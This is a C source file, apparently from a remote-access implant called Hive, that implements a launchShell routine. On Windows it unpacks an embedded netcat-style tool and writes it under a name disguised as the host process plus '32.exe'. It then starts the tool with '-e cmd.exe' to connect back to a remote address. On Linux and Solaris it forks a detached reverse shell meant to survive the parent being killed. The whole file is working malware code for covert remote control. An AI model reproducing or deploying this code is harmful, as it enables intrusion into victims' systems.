#include "launchshell.h"
#include "compat.h"
#include "bzip/bzlib.h"
#include "proj_strings.h"
#include "debug.h"

#ifdef WIN32
#include "prebuildutilinclude.h"
#include <shlwapi.h>

int splitutil(char* charinput, char* charoutput)//,int providname)
{
	int count = 0;
	char modit[256];
	char* pch;
	memset(modit, 0, 256);
	strcpy(modit, charinput);
	pch = strtok(modit, " ");
	while( pch!= NULL)
	{
		if(count == 1)
		{
			strcat(charoutput, " ");
		}
		if(count == 2)
		{
			strcat(charoutput, " -k ");
		}
		count++;
		strcat(charoutput, pch);
		pch = strtok(NULL, " ");

	}
	if(count == 3)
	{
#ifdef WIN32
		//#define n cmexst " -e cmd.exe"
		strcat(charoutput, cmexst);
		//strcat(charoutput, " -e cmd.exe");
#else
		strcat( charoutput, " -e /bin/bash" );
#endif
		/*if( providename == 1)
		{
			//strcat(charoutput, pch);
			pch = strtok(NULL, " ");
		}*/
		return 0;
	}
	return -1;
}

int launchShell(char* charinput)
{
	unsigned int* uncompressedSize = NULL;
	char* uncompressedbuff = NULL;
	int ret = 0;
	FILE *fd_util;
	char filenameofcc[256];
	int sizefilename = 0;
	char* goodname;
	char* almostgoodname;
	PROCESS_INFORMATION pi;
	STARTUPINFO         si;
	char* newish;

	//******************** get it to disk
	uncompressedSize = (unsigned int*) malloc(sizeof(unsigned int));
	uncompressedbuff = (char*) malloc( decompr_len);
	*uncompressedSize = decompr_len;
	ret = BZ2_bzBuffToBuffDecompress( (char*)uncompressedbuff,uncompressedSize,util,util_len,0,0);
	if(ret != BZ_OK)
	{
		return -1;
	}

	//lets do what the customer wants... take the current process name and add 32 to it
	if( 0 == (sizefilename = GetModuleFileNameA( NULL, filenameofcc, 256)))
	{
		return errno;

	}

	almostgoodname = PathFindFileNameA(filenameofcc);

	goodname = (char*) malloc(strlen(almostgoodname) +3);//(sizeof(char) *2) );
	memset(goodname, 0, strlen(almostgoodname) +3);
	memcpy(goodname, almostgoodname, strlen(almostgoodname) - 4);//(sizeof(char)*4) );
	//#define n w32tsst "32.exe"
	memcpy(goodname + strlen(almostgoodname) - (sizeof(char)*4), w32tsst, 6);//sizeof(char)*6 );
	//memcpy(goodname + strlen(almostgoodname) - (sizeof(char)*4), "32.exe", 6);//sizeof(char)*6 );




	fd_util = fopen( goodname, "wb" );
	if(fd_util == 0)
	{
		free(goodname);
		free(uncompressedbuff);
		free(uncompressedSize);
		return errno;
	}
	fwrite(uncompressedbuff, sizeof(char),decompr_len, fd_util);

	free(uncompressedbuff);
	free(uncompressedSize);

	fclose(fd_util);
	//****************** got it to disk


	//****************** now kick it off
	memset(&si, 0, sizeof(si));
	si.cb=sizeof(si);

	newish= (char*) malloc(256);
	memset(newish, 0, 256);
	strcat(newish, goodname);
	strcat(newish, " ");
	if( -1 == splitutil(charinput, newish) )
	{
		free(newish);
		free(goodname);
		return -1;
	}
	//utlan15 = "util.exe 10.3.2.63 4321 -e cmd.exe"
	//utlan01 = "util.exe"
	if( CreateProcess(goodname, newish, NULL, NULL, 0, 0, NULL, NULL, &si, &pi) == 0)
	{
		free(newish);
		free(goodname);
		return -1;
	}
	free(goodname);
	free(newish);
	//CloseHandle(pi.hProcess);
	//CloseHandle(pi.hThread);


	//**********************************
	return SUCCESS;
}

#endif

#if defined SOLARIS || defined LINUX

#include <unistd.h>
#include "jshell.h"
#include "threads.h"
#include "daemonize.h"

int launchShell( char *charinput )
{
	D( printf( " . DEBUG: calling jshell as %s\n", charinput ); )

// fork_process could be used, but would work best if some refactoring
// where done. fork_process() tries to keep the same function prototype
// as pthread_create(), but fork_process() needs to support additional
// options, to be more universal.  in this case, fork_process() can't
// call waitpid() because it needs to return SUCCESS ASAP so the client
// can start the listening shell process
/* 
	if ( fork_process( jshell, (void *)charinput ) != SUCCESS )
	{
		D( printf( " ! ERROR: failed to fork jshell\n" ); )
		return FAILURE;
	}
*/

	if ( fork() == 0 )
	{
		// CHILD
		D( printf( " . DEBUG: I am the child\n" ); )

		// by calling setsid(), if the parent hive process is killed,
		// the shell connection will stay active.  if not using daemonize()
		// then setsid() will need to be called.
		setsid();

		// TODO: ??? create and call a daemonlite() function that doesn't close open file descriptors
		// otherwise, the child closes the existing network connection it needs to send data through
//		daemonize();

		// sleeping allows the parent to return success to the client
		// the client does not open a listening shell until receiving
		// a response from the server.  this maximizes the chance that
		// a client will be listening for the server's reverse connect
		sleep( 1 );

		jshell( (void *)charinput );

		// shell process needs to exit.  the caller is not expecting
		// to handle a return after the shell is finished.
		D( printf( " . DEBUG: exiting the shell process\n" ); )
		exit( 0 );
	}
	else
	{
		// PARENT
		D( printf( " . DEBUG: I am the parent\n" ); )

		// parent connection continues to handle the connection with the Hive ILM client
	}

	return SUCCESS;
}
#endif
